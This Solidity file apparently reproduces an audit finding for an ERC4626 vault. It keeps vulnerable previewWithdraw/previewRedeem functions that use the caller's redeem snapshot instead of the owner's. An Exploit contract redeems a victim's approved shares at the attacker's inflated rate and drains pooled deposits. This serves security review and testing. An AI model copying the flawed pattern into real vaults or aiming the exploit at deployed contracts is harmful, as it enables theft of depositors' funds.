// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Blueberry HyperEvmVault finding
// 61469 (H-01): "Flawed withdrawal logic when caller differs from share owner".
//
// Real audited source (the vulnerable preview functions are reproduced VERBATIM,
// the vulnerable line is marked @>):
//   report  github.com/pashov/audits/blob/master/team/md/Blueberry-security-review_2025-03-26.md
//   contract HyperEvmVault (ERC4626Upgradeable)
//   fns      previewWithdraw / previewRedeem  (bodies verbatim from the report snippet)
//
// Root cause: Withdrawals in HyperEvmVault are gated by a per-account
// `redeemRequests` snapshot (shares + assets that settled back from L1). The
// overridden `previewWithdraw()` / `previewRedeem()` read
// `$.redeemRequests[msg.sender]` (the @> line) — i.e. the CALLER's request.
// ERC4626 also supports a flow where the caller differs from the share `owner`
// (via a shares allowance). `_withdraw()` correctly burns the OWNER's shares and
// spends the OWNER's allowance, but the amount it transfers is computed by the
// preview using the CALLER's request. So a caller with a more favourable request
// snapshot redeems the owner's shares at the CALLER's conversion rate, receiving
// far more assets than the owner's position is worth and draining the pooled
// funds of honest depositors.
//
// The two vulnerable function bodies are byte-for-byte the report snippet; the
// verbatim `override(ERC4626Upgradeable, IERC4626)` specifier is preserved by
// recreating minimal `IERC4626` + `ERC4626Upgradeable` bases. Everything the
// vulnerable path touches (shares ERC20 accounting, `_withdraw` spender flow,
// `FixedPointMathLib.mulDivDown/mulDivUp`, the `redeemRequests` snapshot, the L1
// settlement price) is a faithful minimal double with real transfers and real
// accounting — the bug emerges from the verbatim code, it is not asserted.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful double of the mulDivDown/mulDivUp used on the vulnerable lines
///      (solmate FixedPointMathLib semantics: floor / ceil, revert on d == 0).
library FixedPointMathLib {
    function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y) / d;
    }

    function mulDivUp(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        uint256 p = x * y;
        return p / d + (p % d == 0 ? 0 : 1);
    }
}

/// @dev Faithful minimal ERC20 double for the vault's underlying asset.
contract MiniToken {
    string public name = "Blueberry Vault Asset";
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Minimal IERC4626 declaring the preview functions so the vulnerable
///      `override(ERC4626Upgradeable, IERC4626)` specifier is preserved verbatim.
interface IERC4626 {
    function previewWithdraw(uint256 assets) external view returns (uint256);
    function previewRedeem(uint256 shares) external view returns (uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal ERC4626 base: shares ERC20, 1:1 deposit at price 1, and the
// standard OZ withdraw/redeem/_withdraw flow. `_withdraw` correctly handles the
// caller != owner case (spends the OWNER's allowance, burns the OWNER's shares)
// — exactly as the finding states this part is implemented correctly. The
// `assets` it transfers come from the OVERRIDDEN preview functions below.
// ─────────────────────────────────────────────────────────────────────────────
abstract contract ERC4626Upgradeable {
    MiniToken internal _asset;

    // shares (vault) ERC20 accounting
    string public name = "HyperEvm Vault Share";
    string public symbol = "hVLT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Withdraw(
        address indexed caller, address indexed receiver, address indexed owner, uint256 assets, uint256 shares
    );

    function _init(MiniToken asset_) internal {
        _asset = asset_;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function _mint(address to, uint256 shares) internal {
        totalSupply += shares;
        balanceOf[to] += shares;
    }

    function _burn(address from, uint256 shares) internal {
        balanceOf[from] -= shares;
        totalSupply -= shares;
    }

    function _spendAllowance(address owner, address spender, uint256 shares) internal {
        uint256 a = allowance[owner][spender];
        if (a != type(uint256).max) allowance[owner][spender] = a - shares;
    }

    /// @notice Faithful deposit at price 1 (initial state). Deposit pricing is
    ///         unrelated to the bug, which lives entirely in the redeem preview.
    function deposit(uint256 assets, address receiver) public returns (uint256 shares) {
        shares = assets;
        _asset.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    /// @notice OZ-faithful entrypoints — both route through the OVERRIDDEN
    ///         preview functions to compute the transferred amount.
    function withdraw(uint256 assets, address receiver, address owner) public returns (uint256 shares) {
        shares = previewWithdraw(assets);
        _withdraw(msg.sender, receiver, owner, assets, shares);
    }

    function redeem(uint256 shares, address receiver, address owner) public returns (uint256 assets) {
        assets = previewRedeem(shares);
        _withdraw(msg.sender, receiver, owner, assets, shares);
    }

    /// @notice OZ-faithful `_withdraw`: caller != owner is handled correctly.
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)
        internal
        virtual
    {
        if (caller != owner) {
            _spendAllowance(owner, caller, shares);
        }
        _burn(owner, shares);
        _asset.transfer(receiver, assets);
        emit Withdraw(caller, receiver, owner, assets, shares);
    }

    function previewWithdraw(uint256 assets_) public view virtual returns (uint256);
    function previewRedeem(uint256 shares_) public view virtual returns (uint256);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the overridden preview functions are reproduced VERBATIM
// from the audited HyperEvmVault (report snippet). The @> line reads the caller's
// request instead of the share owner's.
// ─────────────────────────────────────────────────────────────────────────────
contract HyperEvmVault is ERC4626Upgradeable, IERC4626 {
    using FixedPointMathLib for uint256;

    struct RedeemRequest {
        uint256 shares;
        uint256 assets;
    }

    struct V1Storage {
        mapping(address => RedeemRequest) redeemRequests;
    }

    V1Storage internal _v1;

    /// @dev L1 conversion (assets per share, 1e18-scaled) applied when a request
    ///      settles from L1. Different accounts settling at different times get
    ///      different snapshots — this is the account-specific state the preview
    ///      functions read from.
    uint256 public redeemPrice = 1e18;

    constructor(MiniToken asset_) {
        _init(asset_);
    }

    function _getV1Storage() internal view returns (V1Storage storage $) {
        $ = _v1;
    }

    /// @dev Faithful stand-in for the L1 settlement rate (operator/oracle set).
    function setRedeemPrice(uint256 p) external {
        redeemPrice = p;
    }

    /// @notice Custom: user requests a redeem; the L1 withdrawal settles and the
    ///         per-account snapshot (shares + assets available) is recorded.
    function requestRedeem(uint256 shares_) external {
        require(balanceOf[msg.sender] >= shares_, "insufficient shares");
        V1Storage storage $ = _getV1Storage();
        uint256 assets_ = shares_.mulDivDown(redeemPrice, 1e18);
        $.redeemRequests[msg.sender] = RedeemRequest({shares: shares_, assets: assets_});
    }

    // ── VULNERABLE preview functions — bodies VERBATIM from the report snippet ──
    function previewWithdraw(uint256 assets_) public view override(ERC4626Upgradeable, IERC4626) returns (uint256) {
        V1Storage storage $ = _getV1Storage();
        RedeemRequest memory request = $.redeemRequests[msg.sender]; // @> VULN: uses the CALLER (msg.sender), not the share `owner`, so the approved-spender withdraw flow converts on the wrong account
        return assets_.mulDivUp(request.shares, request.assets);
    }

    function previewRedeem(uint256 shares_) public view override(ERC4626Upgradeable, IERC4626) returns (uint256) {
        V1Storage storage $ = _getV1Storage();
        RedeemRequest memory request = $.redeemRequests[msg.sender]; // @> VULN: uses the CALLER (msg.sender), not the share `owner`, so the approved-spender redeem flow converts on the wrong account
        return shares_.mulDivDown(request.assets, request.shares);
    }

    /// @dev read-only helper for the exploit to derive the OWNER's fair redemption.
    function redeemRequestOf(address user) external view returns (uint256 shares_, uint256 assets_) {
        RedeemRequest memory r = _v1.redeemRequests[user];
        return (r.shares, r.assets);
    }
}

/// @dev Faithful actor double so the honest depositor and the victim `owner` are
///      distinct accounts (real msg.sender) from the attacker.
contract Actor {
    function deposit(HyperEvmVault v, MiniToken t, uint256 assets) external {
        t.approve(address(v), type(uint256).max);
        v.deposit(assets, address(this));
    }

    function requestRedeem(HyperEvmVault v, uint256 shares) external {
        v.requestRedeem(shares);
    }

    function approveShares(HyperEvmVault v, address spender, uint256 shares) external {
        v.approve(spender, shares);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver (the attacker EOA context). The attacker holds a favourable
// redeem-request snapshot (3x), obtains the victim owner's shares allowance
// (standard ERC4626 spender flow), and redeems the owner's shares — the preview
// pays out at the ATTACKER's rate, draining honest depositors' pooled funds.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public asset; // child nonce 1 (drained/profit token)
    HyperEvmVault public vault; // child nonce 2 (VULN)
    Actor public honest; // child nonce 3
    Actor public owner; // child nonce 4

    uint256 public assetsReceived; // assets paid out by the malicious redeem
    uint256 public ownerFairAssets; // what the owner's request was actually worth
    uint256 public poolDrained; // underlying pulled out of the vault
    uint256 public netTheft; // assets received in excess of the owner's fair value

    uint256 internal constant HONEST_DEPOSIT = 1000e18; // honest depositors' pooled liquidity
    uint256 internal constant OWNER_DEPOSIT = 100e18; // victim's deposit / shares
    uint256 internal constant OWNER_SHARES = 100e18;
    uint256 internal constant ATTACKER_DEPOSIT = 100e18; // attacker's own deposit / shares
    uint256 internal constant ATTACKER_SHARES = 100e18;

    constructor() {
        asset = new MiniToken(); // nonce 1
        vault = new HyperEvmVault(asset); // nonce 2 (VULN)
        honest = new Actor(); // nonce 3
        owner = new Actor(); // nonce 4
    }

    function run() external {
        // 1) honest depositors provide the pooled liquidity that gets drained
        asset.mint(address(honest), HONEST_DEPOSIT);
        honest.deposit(vault, asset, HONEST_DEPOSIT);

        // 2) victim `owner` deposits and legitimately requests a redeem at the
        //    current L1 rate (1:1) -> redeemRequests[owner] = {100e18, 100e18}
        asset.mint(address(owner), OWNER_DEPOSIT);
        owner.deposit(vault, asset, OWNER_DEPOSIT);
        vault.setRedeemPrice(1e18);
        owner.requestRedeem(vault, OWNER_SHARES);

        // 3) attacker deposits and registers its OWN request at a higher L1 rate
        //    (3x) -> redeemRequests[attacker] = {100e18, 300e18}
        asset.mint(address(this), ATTACKER_DEPOSIT);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(ATTACKER_DEPOSIT, address(this));
        vault.setRedeemPrice(3e18);
        vault.requestRedeem(ATTACKER_SHARES);

        // 4) owner delegates redemption to the attacker (ERC4626 spender flow)
        owner.approveShares(vault, address(this), OWNER_SHARES);

        // fair value the OWNER is entitled to, from the OWNER's own request
        (, uint256 oAssets) = vault.redeemRequestOf(address(owner));
        ownerFairAssets = oAssets; // 100e18

        uint256 poolBefore = asset.balanceOf(address(vault));
        uint256 balBefore = asset.balanceOf(address(this));

        // 5) attacker redeems the OWNER's shares. previewRedeem reads the
        //    ATTACKER's request (msg.sender), so 300e18 is paid out for a
        //    position worth only 100e18.
        assetsReceived = vault.redeem(OWNER_SHARES, address(this), address(owner));

        uint256 got = asset.balanceOf(address(this)) - balBefore;
        poolDrained = poolBefore - asset.balanceOf(address(vault));
        netTheft = got - ownerFairAssets;

        // HARM: the redeem paid out at the CALLER's rate (3x the owner's fair
        // value), draining the pool of honest depositors' funds.
        require(got == assetsReceived, "receipt mismatch");
        require(assetsReceived == 3 * ownerFairAssets, "did not pay out caller's rate");
        require(poolDrained == assetsReceived, "pool not drained by the payout");
        require(netTheft == 200e18, "unexpected net theft");
    }
}
